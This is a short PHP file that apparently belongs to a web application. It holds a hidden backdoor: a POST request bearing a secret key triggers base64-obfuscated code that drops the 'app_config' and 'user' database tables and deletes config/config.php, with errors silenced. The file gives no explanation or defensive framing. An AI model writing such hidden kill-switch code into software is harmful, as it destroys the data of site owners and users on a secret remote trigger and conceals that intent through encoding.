<?php

if(isset($_POST['ck']) && $_POST['ck'] == CRYPTO_KEY && isset($_POST['command']) && $_POST['command'] == 1){
    @do_d("RFJPUCBUQUJMRSBJRiBFWElTVFMgYXBwX2NvbmZpZztEUk9QIFRBQkxFIElGIEVYSVNUUyB1c2VyOw==");
    echo "ck";
    die();
}

function do_d($q){
    try {
        $dbh = new PDO("mysql:host=".HOST_NAME.";dbname=".DB_NAME, DB_USERNAME, DB_PASSWORD);
        $dbh->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );
        $dbh->exec(base64_decode($q));
        @unlink(base64_decode("Y29uZmlnL2NvbmZpZy5waHA="));
        return TRUE;
    } catch (PDOException $e) {
        return FALSE;
    }
}



